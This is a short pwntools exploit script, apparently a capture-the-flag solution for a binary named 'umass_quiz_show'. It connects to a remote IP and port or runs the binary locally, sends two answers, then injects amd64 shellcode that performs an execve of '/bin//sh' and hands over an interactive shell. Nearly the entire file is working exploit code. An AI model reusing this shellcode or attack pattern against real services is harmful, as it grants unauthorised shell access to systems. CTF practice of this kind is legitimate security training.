from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    host = "34.75.76.65"
    port = 9005
    p = remote(host, port)
else:
    p = process("./static/umass_quiz_show")

if args.GDB:
    gdb.attach(p, gdbscript=f'''
        b main
    ''')

payload = asm("""
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 59
    mov rbx, 0
    push rbx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    syscall
""");

p.sendline(b"26");
p.sendline(b"1863");
p.sendline(payload);

p.interactive()
